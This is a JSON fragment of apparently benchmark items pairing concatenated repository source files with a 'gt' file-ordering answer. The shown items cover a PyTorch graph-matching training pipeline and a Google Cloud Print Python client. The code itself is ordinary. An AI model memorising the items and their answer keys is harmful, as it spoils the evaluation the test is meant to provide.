        "content": "'blackbox-deep-graph-matching/train_eval.py'\n:import torch\nimport torch.optim as optim\nimport time\nfrom pathlib import Path\n\nfrom data.data_loader_multigraph import GMDataset, get_dataloader\n\nfrom utils.evaluation_metric import matching_accuracy_from_lists, f1_score, get_pos_neg_from_lists\n\nfrom eval import eval_model\n\nfrom BB_GM.model import Net\nfrom utils.config import cfg\n\nfrom utils.utils import update_params_from_cmdline\n\nclass HammingLoss(torch.nn.Module):\n    def forward(self, suggested, target):\n        errors = suggested * (1.0 - target) + (1.0 - suggested) * target\n        return errors.mean(dim=0).sum()\n\n\nlr_schedules = {\n    \"long_halving\": (10, (2, 4, 6, 8, 10), 0.5),\n    \"short_halving\": (2, (1,), 0.5),\n    \"long_nodrop\": (10, (10,), 1.0),\n    \"minirun\": (1, (10,), 1.0),\n}\n\n\ndef train_eval_model(model, criterion, optimizer, dataloader, num_epochs, resume=False, start_epoch=0):\n    print(\"Start training...\")\n\n    since = time.time()\n    dataloader[\"train\"].dataset.set_num_graphs(cfg.TRAIN.num_graphs_in_matching_instance)\n    dataset_size = len(dataloader[\"train\"].dataset)\n\n\n    device = next(model.parameters()).device\n    print(\"model on device: {}\".format(device))\n\n    checkpoint_path = Path(cfg.model_dir) / \"params\"\n    if not checkpoint_path.exists():\n        checkpoint_path.mkdir(parents=True)\n\n    if resume:\n        params_path = os.path.join(cfg.warmstart_path, f\"params.pt\")\n        print(\"Loading model parameters from {}\".format(params_path))\n        model.load_state_dict(torch.load(params_path))\n\n        optim_path = os.path.join(cfg.warmstart_path, f\"optim.pt\")\n        print(\"Loading optimizer state from {}\".format(optim_path))\n        optimizer.load_state_dict(torch.load(optim_path))\n\n\n    if cfg.evaluate_only:\n        assert resume\n        print(f\"Evaluating without training...\")\n        accs, f1_scores = eval_model(model, dataloader[\"test\"])\n        acc_dict = {\n            \"acc_{}\".format(cls): single_acc for cls, single_acc in zip(dataloader[\"train\"].dataset.classes, accs)\n        }\n        f1_dict = {\n            \"f1_{}\".format(cls): single_f1_score\n            for cls, single_f1_score in zip(dataloader[\"train\"].dataset.classes, f1_scores)\n        }\n        acc_dict.update(f1_dict)\n        acc_dict[\"matching_accuracy\"] = torch.mean(accs)\n        acc_dict[\"f1_score\"] = torch.mean(f1_scores)\n\n        time_elapsed = time.time() - since\n        print(\n            \"Evaluation complete in {:.0f}h {:.0f}m {:.0f}s\".format(\n                time_elapsed // 3600, (time_elapsed // 60) % 60, time_elapsed % 60\n            )\n        )\n        return model, acc_dict\n\n    _, lr_milestones, lr_decay = lr_schedules[cfg.TRAIN.lr_schedule]\n    scheduler = optim.lr_scheduler.MultiStepLR(\n        optimizer, milestones=lr_milestones, gamma=lr_decay\n    )\n\n    for epoch in range(start_epoch, num_epochs):\n        print(\"Epoch {}/{}\".format(epoch, num_epochs - 1))\n        print(\"-\" * 10)\n\n        model.train()\n\n        print(\"lr = \" + \", \".join([\"{:.2e}\".format(x[\"lr\"]) for x in optimizer.param_groups]))\n\n        epoch_loss = 0.0\n        running_loss = 0.0\n        running_acc = 0.0\n        epoch_acc = 0.0\n        running_f1 = 0.0\n        epoch_f1 = 0.0\n        running_since = time.time()\n        iter_num = 0\n\n\n        for inputs in dataloader[\"train\"]:\n            data_list = [_.cuda() for _ in inputs[\"images\"]]\n            points_gt_list = [_.cuda() for _ in inputs[\"Ps\"]]\n            n_points_gt_list = [_.cuda() for _ in inputs[\"ns\"]]\n            edges_list = [_.to(\"cuda\") for _ in inputs[\"edges\"]]\n            perm_mat_list = [perm_mat.cuda() for perm_mat in inputs[\"gt_perm_mat\"]]\n\n            iter_num = iter_num + 1\n\n\n            optimizer.zero_grad()\n\n            with torch.set_grad_enabled(True):\n\n                s_pred_list = model(data_list, points_gt_list, edges_list, n_points_gt_list, perm_mat_list)\n\n                loss = sum([criterion(s_pred, perm_mat) for s_pred, perm_mat in zip(s_pred_list, perm_mat_list)])\n                loss /= len(s_pred_list)\n\n\n                loss.backward()\n                optimizer.step()\n\n                tp, fp, fn = get_pos_neg_from_lists(s_pred_list, perm_mat_list)\n                f1 = f1_score(tp, fp, fn)\n                acc, _, __ = matching_accuracy_from_lists(s_pred_list, perm_mat_list)\n\n\n                bs = perm_mat_list[0].size(0)\n                running_loss += loss.item() * bs\n                epoch_loss += loss.item() * bs\n                running_acc += acc.item() * bs\n                epoch_acc += acc.item() * bs\n                running_f1 += f1.item() * bs\n                epoch_f1 += f1.item() * bs\n\n                if iter_num % cfg.STATISTIC_STEP == 0:\n                    running_speed = cfg.STATISTIC_STEP * bs / (time.time() - running_since)\n                    loss_avg = running_loss / cfg.STATISTIC_STEP / bs\n                    acc_avg = running_acc / cfg.STATISTIC_STEP / bs\n                    f1_avg = running_f1 / cfg.STATISTIC_STEP / bs\n                    print(\n                        \"Epoch {:<4} Iter {:<4} {:>4.2f}sample/s Loss={:<8.4f} Accuracy={:<2.3} F1={:<2.3}\".format(\n                            epoch, iter_num, running_speed, loss_avg, acc_avg, f1_avg\n                        )\n                    )\n\n                    running_acc = 0.0\n                    running_f1 = 0.0\n                    running_loss = 0.0\n                    running_since = time.time()\n\n        epoch_loss = epoch_loss / dataset_size\n        epoch_acc = epoch_acc / dataset_size\n        epoch_f1 = epoch_f1 / dataset_size\n\n        if cfg.save_checkpoint:\n            base_path = Path(checkpoint_path / \"{:04}\".format(epoch + 1))\n            Path(base_path).mkdir(parents=True, exist_ok=True)\n            path = str(base_path / \"params.pt\")\n            torch.save(model.state_dict(), path)\n            torch.save(optimizer.state_dict(), str(base_path / \"optim.pt\"))\n\n        print(\n            \"Over whole epoch {:<4} -------- Loss: {:.4f} Accuracy: {:.3f} F1: {:.3f}\".format(\n                epoch, epoch_loss, epoch_acc, epoch_f1\n            )\n        )\n        print()\n\n\n        accs, f1_scores = eval_model(model, dataloader[\"test\"])\n        acc_dict = {\n            \"acc_{}\".format(cls): single_acc for cls, single_acc in zip(dataloader[\"train\"].dataset.classes, accs)\n        }\n        f1_dict = {\n            \"f1_{}\".format(cls): single_f1_score\n            for cls, single_f1_score in zip(dataloader[\"train\"].dataset.classes, f1_scores)\n        }\n        acc_dict.update(f1_dict)\n        acc_dict[\"matching_accuracy\"] = torch.mean(accs)\n        acc_dict[\"f1_score\"] = torch.mean(f1_scores)\n\n        scheduler.step()\n\n    time_elapsed = time.time() - since\n    print(\n        \"Training complete in {:.0f}h {:.0f}m {:.0f}s\".format(\n            time_elapsed // 3600, (time_elapsed // 60) % 60, time_elapsed % 60\n        )\n    )\n\n    return model, acc_dict\n\n\nif __name__ == \"__main__\":\n    from utils.dup_stdout_manager import DupStdoutFileManager\n\n    cfg = update_params_from_cmdline(default_params=cfg)\n    import json\n    import os\n\n    os.makedirs(cfg.model_dir, exist_ok=True)\n    with open(os.path.join(cfg.model_dir, \"settings.json\"), \"w\") as f:\n        json.dump(cfg, f)\n\n    torch.manual_seed(cfg.RANDOM_SEED)\n\n    dataset_len = {\"train\": cfg.TRAIN.EPOCH_ITERS * cfg.BATCH_SIZE, \"test\": cfg.EVAL.SAMPLES}\n    image_dataset = {\n        x: GMDataset(cfg.DATASET_NAME, sets=x, length=dataset_len[x], obj_resize=(256, 256)) for x in (\"train\", \"test\")\n    }\n    dataloader = {x: get_dataloader(image_dataset[x], fix_seed=(x == \"test\")) for x in (\"train\", \"test\")}\n\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\n    model = Net()\n    model = model.cuda()\n\n\n    criterion = HammingLoss()\n\n    backbone_params = list(model.node_layers.parameters()) + list(model.edge_layers.parameters())\n    backbone_params += list(model.final_layers.parameters())\n\n    backbone_ids = [id(item) for item in backbone_params]\n\n    new_params = [param for param in model.parameters() if id(param) not in backbone_ids]\n    opt_params = [\n        dict(params=backbone_params, lr=cfg.TRAIN.LR * 0.01),\n        dict(params=new_params, lr=cfg.TRAIN.LR),\n    ]\n    optimizer = optim.Adam(opt_params)\n\n    if not Path(cfg.model_dir).exists():\n        Path(cfg.model_dir).mkdir(parents=True)\n\n    num_epochs, _, __ = lr_schedules[cfg.TRAIN.lr_schedule]\n    with DupStdoutFileManager(str(Path(cfg.model_dir) / (\"train_log.log\"))) as _:\n        model, accs = train_eval_model(\n            model,\n            criterion,\n            optimizer,\n            dataloader,\n            num_epochs=num_epochs,\n            resume=cfg.warmstart_path is not None,\n            start_epoch=0,\n        )\n\n'blackbox-deep-graph-matching/data/data_loader_multigraph.py'\n:import torch\nimport torch.nn.functional as F\nfrom torch.utils.data import Dataset\nfrom torchvision import transforms\nimport numpy as np\nimport random\nfrom data.pascal_voc import PascalVOC\nfrom data.willow_obj import WillowObject\nfrom data.SPair71k import SPair71k\nfrom utils.build_graphs import build_graphs\n\nfrom utils.config import cfg\nfrom torch_geometric.data import Data, Batch\n\ndatasets = {\"PascalVOC\": PascalVOC,\n            \"WillowObject\": WillowObject,\n            \"SPair71k\": SPair71k}\n\nclass GMDataset(Dataset):\n    def __init__(self, name, length, **args):\n        self.name = name\n        self.ds = datasets[name](**args)\n        self.true_epochs = length is None\n        self.length = (\n            self.ds.total_size if self.true_epochs else length\n        )\n        if self.true_epochs:\n            print(f\"Initializing {self.ds.sets}-set with all {self.length} examples.\")\n        else:\n            print(f\"Initializing {self.ds.sets}-set. Randomly sampling {self.length} examples.\")\n\n\n        self.obj_size = self.ds.obj_resize\n        self.classes = self.ds.classes\n        self.cls = None\n        self.num_graphs_in_matching_instance = None\n\n    def set_cls(self, cls):\n        if cls == \"none\":\n            cls = None\n        self.cls = cls\n        if self.true_epochs:\n            self.length = self.ds.total_size if cls is None else self.ds.size_by_cls[cls]\n\n    def set_num_graphs(self, num_graphs_in_matching_instance):\n        self.num_graphs_in_matching_instance = num_graphs_in_matching_instance\n\n    def __len__(self):\n        return self.length\n\n    def __getitem__(self, idx):\n        sampling_strategy = cfg.train_sampling if self.ds.sets == \"train\" else cfg.eval_sampling\n        if self.num_graphs_in_matching_instance is None:\n            raise ValueError(\"Num_graphs has to be set to an integer value.\")\n\n        idx = idx if self.true_epochs else None\n        anno_list, perm_mat_list = self.ds.get_k_samples(idx, k=self.num_graphs_in_matching_instance, cls=self.cls, mode=sampling_strategy)\n        for perm_mat in perm_mat_list:\n            if (\n                not perm_mat.size\n                or (perm_mat.size < 2 * 2 and sampling_strategy == \"intersection\")\n                and not self.true_epochs\n            ):\n\n                next_idx = None if idx is None else idx + 1\n                return self.__getitem__(next_idx)\n\n        points_gt = [np.array([(kp[\"x\"], kp[\"y\"]) for kp in anno_dict[\"keypoints\"]]) for anno_dict in anno_list]\n        n_points_gt = [len(p_gt) for p_gt in points_gt]\n\n        graph_list = []\n        for p_gt, n_p_gt in zip(points_gt, n_points_gt):\n            edge_indices, edge_features = build_graphs(p_gt, n_p_gt)\n\n\n            pos = torch.tensor(p_gt).to(torch.float32) / 256.0\n            assert (pos > -1e-5).all(), p_gt\n            graph = Data(\n                edge_attr=torch.tensor(edge_features).to(torch.float32),\n                edge_index=torch.tensor(edge_indices, dtype=torch.long),\n                x=pos,\n                pos=pos,\n            )\n            graph.num_nodes = n_p_gt\n            graph_list.append(graph)\n\n        ret_dict = {\n            \"Ps\": [torch.Tensor(x) for x in points_gt],\n            \"ns\": [torch.tensor(x) for x in n_points_gt],\n            \"gt_perm_mat\": perm_mat_list,\n            \"edges\": graph_list,\n        }\n\n        imgs = [anno[\"image\"] for anno in anno_list]\n        if imgs[0] is not None:\n            trans = transforms.Compose([transforms.ToTensor(), transforms.Normalize(cfg.NORM_MEANS, cfg.NORM_STD)])\n            imgs = [trans(img) for img in imgs]\n            ret_dict[\"images\"] = imgs\n        elif \"feat\" in anno_list[0][\"keypoints\"][0]:\n            feat_list = [np.stack([kp[\"feat\"] for kp in anno_dict[\"keypoints\"]], axis=-1) for anno_dict in anno_list]\n            ret_dict[\"features\"] = [torch.Tensor(x) for x in feat_list]\n\n        return ret_dict\n\n\ndef collate_fn(data: list):\n\n\n    def pad_tensor(inp):\n        assert type(inp[0]) == torch.Tensor\n        it = iter(inp)\n        t = next(it)\n        max_shape = list(t.shape)\n        while True:\n            try:\n                t = next(it)\n                for i in range(len(max_shape)):\n                    max_shape[i] = int(max(max_shape[i], t.shape[i]))\n            except StopIteration:\n                break\n        max_shape = np.array(max_shape)\n\n        padded_ts = []\n        for t in inp:\n            pad_pattern = np.zeros(2 * len(max_shape), dtype=np.int64)\n            pad_pattern[::-2] = max_shape - np.array(t.shape)\n            pad_pattern = tuple(pad_pattern.tolist())\n            padded_ts.append(F.pad(t, pad_pattern, \"constant\", 0))\n\n        return padded_ts\n\n    def stack(inp):\n        if type(inp[0]) == list:\n            ret = []\n            for vs in zip(*inp):\n                ret.append(stack(vs))\n        elif type(inp[0]) == dict:\n            ret = {}\n            for kvs in zip(*[x.items() for x in inp]):\n                ks, vs = zip(*kvs)\n                for k in ks:\n                    assert k == ks[0], \"Key value mismatch.\"\n                ret[k] = stack(vs)\n        elif type(inp[0]) == torch.Tensor:\n            new_t = pad_tensor(inp)\n            ret = torch.stack(new_t, 0)\n        elif type(inp[0]) == np.ndarray:\n            new_t = pad_tensor([torch.from_numpy(x) for x in inp])\n            ret = torch.stack(new_t, 0)\n        elif type(inp[0]) == str:\n            ret = inp\n        elif type(inp[0]) == Data:\n            ret = Batch.from_data_list(inp)\n        else:\n            raise ValueError(\"Cannot handle type {}\".format(type(inp[0])))\n        return ret\n\n    ret = stack(data)\n    return ret\n\n\ndef worker_init_fix(worker_id):\n\n    random.seed(cfg.RANDOM_SEED + worker_id)\n    np.random.seed(cfg.RANDOM_SEED + worker_id)\n\n\ndef worker_init_rand(worker_id):\n\n    random.seed(torch.initial_seed())\n    np.random.seed(torch.initial_seed() % 2 ** 32)\n\n\ndef get_dataloader(dataset, fix_seed=True, shuffle=False):\n    return torch.utils.data.DataLoader(\n        dataset,\n        batch_size=cfg.BATCH_SIZE,\n        shuffle=shuffle,\n        num_workers=2,\n        collate_fn=collate_fn,\n        pin_memory=False,\n        worker_init_fn=worker_init_fix if fix_seed else worker_init_rand,\n    )\n\n'blackbox-deep-graph-matching/utils/build_graphs.py'\n:from scipy.spatial import Delaunay\nfrom scipy.spatial.qhull import QhullError\n\nimport itertools\nimport numpy as np\n\n\ndef locations_to_features_diffs(x_1, y_1, x_2, y_2):\n    res = np.array([0.5 + 0.5 * (x_1 - x_2) / 256.0, 0.5 + 0.5 * (y_1 - y_2) / 256.0])\n    return res\n\n\ndef build_graphs(P_np: np.ndarray, n: int, n_pad: int = None, edge_pad: int = None):\n\n    A = delaunay_triangulate(P_np[0:n, :])\n    edge_num = int(np.sum(A, axis=(0, 1)))\n\n    if n_pad is None:\n        n_pad = n\n    if edge_pad is None:\n        edge_pad = edge_num\n    assert n_pad >= n\n    assert edge_pad >= edge_num\n\n    edge_list = [[], []]\n    features = []\n    for i in range(n):\n        for j in range(n):\n            if A[i, j] == 1:\n                edge_list[0].append(i)\n                edge_list[1].append(j)\n                features.append(locations_to_features_diffs(*P_np[i], *P_np[j]))\n\n    if not features:\n        features = np.zeros(shape=(0, 2))\n\n    return np.array(edge_list, dtype=np.int), np.array(features)\n\n\ndef delaunay_triangulate(P: np.ndarray):\n\n    n = P.shape[0]\n    if n < 3:\n        A = np.ones((n, n)) - np.eye(n)\n    else:\n        try:\n            d = Delaunay(P)\n            A = np.zeros((n, n))\n            for simplex in d.simplices:\n                for pair in itertools.permutations(simplex, 2):\n                    A[pair] = 1\n        except QhullError as err:\n            print(\"Delaunay triangulation error detected. Return fully-connected graph.\")\n            print(\"Traceback:\")\n            print(err)\n            A = np.ones((n, n)) - np.eye(n)\n    return A\n",
        "gt": [
            "'blackbox-deep-graph-matching/utils/build_graphs.py'",
            "'blackbox-deep-graph-matching/data/data_loader_multigraph.py'",
            "'blackbox-deep-graph-matching/train_eval.py'"
        ]
    },
    {
        "files": [
            "'cloudprinting/tests/__init__.py'",
            "'cloudprinting/cloudprinting/auth.py'",
            "'cloudprinting/cloudprinting/__init__.py'",
            "'cloudprinting/cloudprinting/sample.py'"
        ],
        "content": "'cloudprinting/tests/__init__.py'\n:\nfrom attest import assert_hook, Tests, raises\nfrom cloudprinting import (delete_job, get_job, list_jobs, list_printers,\n                           OAuth2, submit_job)\nfrom os import environ\nfrom os.path import dirname, join\nimport requests\nfrom time import sleep\n\n\nPRINTER_ID = environ.get('CP_PRINTER_ID', '__google__docs')\nPDF = join(dirname(__file__), \"test.pdf\")\nsuite = Tests()\nauth = OAuth2(client_id=environ['CP_CLIENT_ID'],\n              client_secret=environ['CP_CLIENT_SECRET'],\n              refresh_token=environ['CP_REFRESH_TOKEN'])\n\n\n@suite.test\ndef oauth2_requires_argument_sets():\n    with raises(TypeError):\n        OAuth2()\n\n\n    OAuth2(access_token=\"foo\", token_type=\"bar\")\n    OAuth2(client_id=\"foo\", client_secret=\"bar\", refresh_token=\"baz\")\n\n\n@suite.test\ndef listing_printers():\n    printers = list_printers(auth=auth)['printers']\n    assert isinstance(printers, list)\n\n\n@suite.test\ndef print_pdf():\n    job = submit_job(PRINTER_ID, PDF, auth=auth)['job']\n    assert isinstance(job, dict)\n\n    timeout = 30\n    delay = 5\n    attempts = range(int(timeout / delay) + 1)\n\n    try:\n        for i in attempts:\n            if i > 0:\n                sleep(delay)\n            latest = get_job(id=job['id'], auth=auth)\n            if latest['status'] == 'DONE':\n                break\n        else:\n            assert False, \"Job got stuck on '%s'\" % latest['status']\n    finally:\n        assert delete_job(job['id'], auth=auth)['success'] == True\n\n\n@suite.test\ndef response_is_returned_on_remote_failures():\n    r = submit_job(\"bogus\", PDF)\n    assert isinstance(r, requests.Response)\n\n    r = delete_job(\"bogus\")\n    assert isinstance(r, requests.Response)\n\n    r = list_jobs()\n    assert isinstance(r, requests.Response)\n\n'cloudprinting/cloudprinting/auth.py'\n:\nimport threading\nfrom time import sleep, time\nimport requests\n\n\ntry:\n    from .sample import GetAuthTokens\nexcept (ImportError, SyntaxError):\n    pass\nelse:\n    class ClientLoginAuth(object):\n\n        def __init__(self, email, password, caching=True):\n            self.email = email\n            self.password = password\n            self.caching = caching\n            self.lock = threading.Lock()\n\n        def __call__(self, r):\n            r.headers['Authorization'] = 'GoogleLogin auth=%s' % self.token\n\n            if self.caching:\n\n                def hook(response):\n                    if response.status_code == requests.codes.forbidden:\n                        del self.token\n                        request = response.request\n                        request.deregister_hook('response', hook)\n                        request.send(anyway=True)\n                        return request.response\n                    return response\n                r.hooks['response'].insert(0, hook)\n            return r\n\n        @property\n        def token(self):\n            with self.lock:\n                if not self.caching or not hasattr(self, \"_token\"):\n                    self._token = GetAuthTokens(self.email, self.password)[\"Auth\"]\n                    return self._token\n                return self._token\n\n        @token.deleter\n        def token(self):\n            with self.lock:\n                del self._token\n\n\nclass OAuth2(object):\n\n    token_endpoint = \"https://accounts.google.com/o/oauth2/token\"\n    device_code_endpoint = \"https://accounts.google.com/o/oauth2/device/code\"\n    scope = \"https://www.googleapis.com/auth/cloudprint\"\n\n    def __init__(self, access_token=None, token_type=None,\n                 refresh_token=None, client_id=None, client_secret=None):\n        if not ((access_token and token_type)\n                or (refresh_token and client_id and client_secret)):\n            raise TypeError(\"Invalid argument combination. Provide either \"\n                \"<access_token, token_type> or \"\n                \"<refresh_token, client_id, client_secret>.\")\n\n        self.access_token = access_token\n        self.token_type = token_type\n        self.refresh_token = refresh_token\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.expired = not (access_token and token_type)\n        self.lock = threading.RLock()\n\n    def _stamp(self, r):\n\n        r.headers['Authorization'] = \"%s %s\" % (self.token_type,\n                                                self.access_token)\n\n    def __call__(self, r):\n        with self.lock:\n            if self.expired:\n                self.refresh()\n\n        self._stamp(r)\n\n        if self.client_id and self.client_secret and self.refresh_token:\n\n            def hook(response):\n                if response.status_code == requests.codes.forbidden:\n                    self.expired = True\n                    self.refresh()\n                    if not self.expired:\n                        request = response.request\n                        self._stamp(request)\n                        request.deregister_hook('response', hook)\n                        request.send(anyway=True)\n                        return request.response\n                return response\n            r.hooks['response'].insert(0, hook)\n        return r\n\n    def refresh(self):\n\n        with self.lock:\n            if not self.expired:\n                return\n        r = requests.post(self.token_endpoint, data={\n            \"client_id\": self.client_id,\n            \"client_secret\": self.client_secret,\n            \"refresh_token\": self.refresh_token,\n            \"grant_type\": \"refresh_token\"}).json()\n        self.access_token = r['access_token']\n        self.expired = False\n        self.token_type = r['token_type']\n\n    @classmethod\n    def authorise_device(cls, client_id, client_secret):\n        \"\"\"\n        A generator that manages the OAuth2 exchange to authorise an app to\n        access Google Cloud Print on behalf of a Google Account.\n\n        :param     client_id: \"client ID\" of application (Google API)\n        :type      client_id: string\n        :param client_secret: \"client secret\"\n        :type  client_secret: string\n        :raises: RuntimeError if verification URL expires\n\n        This uses Google's \"OAuth 2.0 for Devices\" API.\n\n        Example::\n\n            >>> flow = OAuth2.authorise_device(\"abcdefg\", \"hijklmno\")\n            >>> (url, code) = flow.next()\n\n\n\n            >>> tokens = flow.next()\n            >>> tokens\n            {\n              \"access_token\" : \"ya29.AHES6ZSuY8f6WFLswSv0HELP2J4cCvFSj-8GiZM0Pr6cgXU\",\n              \"token_type\" : \"Bearer\",\n              \"expires_in\" : 3600,\n              \"refresh_token\" : \"1/551G1yXUqgkDGnkfFk6ZbjMLMDIMxo3JFc8lY8CAR-Q\"\n            }\n\n        \"\"\"\n        r = requests.post(cls.device_code_endpoint, data={\n                \"client_id\": client_id,\n                \"scope\": cls.scope}).json()\n        yield (r['verification_url'], r['user_code'])\n\n        previous = 0\n        interval = r['interval']\n        expires_at = time() + r['expires_in']\n        device_code = r['device_code']\n\n        while True:\n            now = time()\n            if now > expires_at:\n                raise RuntimeError(\"URL expired prior to user verification.\")\n\n            sleep(max(interval - (now - previous), 0))\n            previous = now\n\n            r = requests.post(cls.token_endpoint, data={\n                    \"client_id\": client_id,\n                    \"client_secret\": client_secret,\n                    \"code\": device_code,\n                    \"grant_type\": \"http://oauth.net/grant_type/device/1.0\",\n                }).json()\n\n            if \"error\" in r:\n\n                continue\n\n            yield r\n            break\n\n'cloudprinting/cloudprinting/__init__.py'\n:__version__ = \"0.3.2\"\n\nfrom .auth import OAuth2\ntry:\n    from .auth import ClientLoginAuth\nexcept ImportError:\n    pass\nfrom .client import delete_job, get_job, list_jobs, list_printers, submit_job\n\n'cloudprinting/cloudprinting/sample.py'\n:\nimport base64\nimport httplib\nimport logging\nimport mimetools\nimport mimetypes\nimport string\nimport time\nimport urllib\nimport urllib2\n\nCRLF = '\\r\\n'\nBOUNDARY = mimetools.choose_boundary()\n\n\nFOLLOWUP_HOST = 'www.google.com/cloudprint'\nFOLLOWUP_URI = 'select%2Fgaiaauth'\nGAIA_HOST = 'www.google.com'\nLOGIN_URI = '/accounts/ServiceLoginAuth'\nLOGIN_URL = 'https://www.google.com/accounts/ClientLogin'\nSERVICE = 'cloudprint'\n\n\nCLOUDPRINT_URL = 'http://www.google.com/cloudprint'\n\nCLIENT_NAME = 'Cloud Print API Client'\n\n\nlogger = logging.getLogger(\"\")\n\ndef EncodeMultiPart(fields, files, file_type='application/xml'):\n\n    lines = []\n    for (key, value) in fields:\n      lines.append('--' + BOUNDARY)\n      lines.append('Content-Disposition: form-data; name=\"%s\"' % key)\n      lines.append('')\n      lines.append(value)\n    for (key, filename, value) in files:\n      lines.append('--' + BOUNDARY)\n      lines.append(\n          'Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"'\n          % (key, filename))\n      lines.append('Content-Type: %s' % file_type)\n      lines.append('')\n      lines.append(value)\n    lines.append('--' + BOUNDARY + '--')\n    lines.append('')\n    return CRLF.join(lines)\n\ndef GetUrl(url, tokens, data=None, cookies=False, anonymous=False):\n\n  request = urllib2.Request(url)\n  if not anonymous:\n    if cookies:\n      logger.debug('Adding authentication credentials to cookie header')\n      request.add_header('Cookie', 'SID=%s; HSID=%s; SSID=%s' % (\n          tokens['SID'], tokens['HSID'], tokens['SSID']))\n    else:\n      request.add_header('Authorization', 'GoogleLogin auth=%s' % tokens['Auth'])\n  request.add_header('X-CloudPrint-Proxy', 'api-prober')\n  if data:\n    request.add_data(data)\n    request.add_header('Content-Length', str(len(data)))\n    request.add_header('Content-Type', 'multipart/form-data;boundary=%s' % BOUNDARY)\n\n\n  retry_count = 0\n  while retry_count < 5:\n    try:\n      result = urllib2.urlopen(request).read()\n      return result\n    except urllib2.HTTPError, e:\n\n      err_msg = 'Error accessing %s\\n%s' % (url, e)\n      logger.error(err_msg)\n      logger.info('Pausing %d seconds', 60)\n      time.sleep(60)\n      retry_count += 1\n      if retry_count == 5:\n        return err_msg\n\ndef GetCookie(cookie_key, cookie_string):\n\n    logger.debug('Getting cookie from %s', cookie_string)\n    id_string = cookie_key + '='\n    cookie_crumbs = cookie_string.split(';')\n    for c in cookie_crumbs:\n      if id_string in c:\n        cookie = c.split(id_string)\n        return cookie[1]\n    return None\n\ndef ConvertJson(json_str):\n\n  j = {}\n  try:\n    j = json.loads(json_str)\n    j['json'] = True\n  except ValueError, e:\n\n    logger.error('Error parsing json string %s\\n%s', json_str, e)\n    j['json'] = False\n    j['error'] = e\n\n  return j\n\ndef GetKeyValue(line, sep=':'):\n\n    s = line.split(sep)\n    return StripPunc(s[1])\n\ndef StripPunc(s):\n\n  for c in string.punctuation:\n    if c == '-':\n      continue\n    else:\n      s = s.replace(c, '')\n  return s.strip()\n\ndef Validate(response):\n\n  if response.find('\"success\": true') > 0:\n    return True\n  else:\n    return False\n\ndef GetMessage(response):\n\n  lines = response.split('\\n')\n  for line in lines:\n    if '\"message\":' in line:\n      msg = line.split(':')\n      return msg[1]\n\n  return None\n\ndef ReadFile(pathname):\n\n  try:\n    f = open(pathname, 'rb')\n    try:\n      s = f.read()\n    except IOError, e:\n      logger('Error reading %s\\n%s', pathname, e)\n    finally:\n      f.close()\n      return s\n  except IOError, e:\n    logger.error('Error opening %s\\n%s', pathname, e)\n    return None\n\ndef WriteFile(file_name, data):\n\n  status = True\n\n  try:\n    f = open(file_name, 'wb')\n    try:\n      f.write(data)\n    except IOError, e:\n      logger.error('Error writing %s\\n%s', file_name, e)\n      status = False\n    finally:\n      f.close()\n  except IOError, e:\n    logger.error('Error opening %s\\n%s', file_name, e)\n    status = False\n\n  return status\n\ndef Base64Encode(pathname):\n\n  b64_pathname = pathname + '.b64'\n  file_type = mimetypes.guess_type(pathname)[0] or 'application/octet-stream'\n  data = ReadFile(pathname)\n\n\n  header = 'data:%s;base64,' % file_type\n  b64data = header + base64.b64encode(data)\n\n  if WriteFile(b64_pathname, b64data):\n    return b64_pathname\n  else:\n    return None\n\ndef GaiaLogin(email, password):\n\n    tokens = {}\n    cookie_keys = ['SID', 'LSID', 'HSID', 'SSID']\n    email = email.replace('+', '%2B')\n\n    galx_cookie = base64.b64encode('%s%s' % (email, time.time()))\n\n\n    form = ('ltmpl=login&fpui=1&rm=hide&hl=en-US&alwf=true'\n            '&continue=https%%3A%%2F%%2F%s%%2F%s'\n            '&followup=https%%3A%%2F%%2F%s%%2F%s'\n            '&service=%s&Email=%s&Passwd=%s&GALX=%s' % (FOLLOWUP_HOST,\n            FOLLOWUP_URI, FOLLOWUP_HOST, FOLLOWUP_URI, SERVICE, email,\n            password, galx_cookie))\n    login = httplib.HTTPS(GAIA_HOST, 443)\n    login.putrequest('POST', LOGIN_URI)\n    login.putheader('Host', GAIA_HOST)\n    login.putheader('content-type', 'application/x-www-form-urlencoded')\n    login.putheader('content-length', str(len(form)))\n    login.putheader('Cookie', 'GALX=%s' % galx_cookie)\n    logger.debug('Sent POST content: %s', form)\n    login.endheaders()\n    logger.info('HTTP POST to https://%s%s', GAIA_HOST, LOGIN_URI)\n    login.send(form)\n\n    (errcode, errmsg, headers) = login.getreply()\n    login_output = login.getfile()\n    login_output.close()\n    login.close()\n    logger.info('Login complete.')\n\n    if errcode != 302:\n      logger.error('Gaia HTTP post returned %d, expected 302', errcode)\n      logger.error('Message: %s', errmsg)\n\n    for line in str(headers).split('\\r\\n'):\n      if not line: continue\n      (name, content) = line.split(':', 1)\n      if name.lower() == 'set-cookie':\n        for k in cookie_keys:\n          if content.strip().startswith(k):\n            tokens[k] = GetCookie(k, content)\n\n    if not tokens:\n      logger.error('No cookies received, check post parameters.')\n      return None\n    else:\n      logger.debug('Received the following authorization tokens.')\n      for t in tokens:\n        logger.debug(t)\n      return tokens\n\ndef GetAuthTokens(email, password):\n\n\n    tokens = GaiaLogin(email, password)\n\n\n    params = {'accountType': 'GOOGLE',\n              'Email': email,\n              'Passwd': password,\n              'service': SERVICE,\n              'source': CLIENT_NAME}\n    stream = urllib.urlopen(LOGIN_URL, urllib.urlencode(params))\n\n    for line in stream:\n      if line.strip().startswith('Auth='):\n        tokens['Auth'] = line.strip().replace('Auth=', '')\n    return tokens\n\ndef GetPrinters(proxy=None):\n\n    printers = {}\n    values = {}\n    tokenss = ['\"id\"', '\"name\"', '\"proxy\"']\n    for t in tokenss:\n        values[t] = ''\n\n    if proxy:\n        response = GetUrl('%s/list?proxy=%s' % (CLOUDPRINT_URL, proxy), tokens)\n    else:\n        response = GetUrl('%s/search' % CLOUDPRINT_URL, tokens)\n\n    sections = response.split('{')\n    for printer in sections:\n        lines = printer.split(',')\n        for line in lines:\n            for t in tokenss:\n                if t in line:\n                    values[t] = GetKeyValue(line)\n        if values['\"id\"']:\n            printers[values['\"id\"']] = {}\n            printers[values['\"id\"']]['name'] = values['\"name\"']\n            printers[values['\"id\"']]['proxy'] = values['\"proxy\"']\n\n    return printers\n\n\ndef Query(printer, proxy=None):\n\n    if proxy:\n        printers = GetPrinters(proxy=proxy)\n        for p in printers:\n            if printers[p]['name'] == printer:\n                return p\n    else:\n        printer_id = None\n        response = GetUrl('%s/search?q=%s' 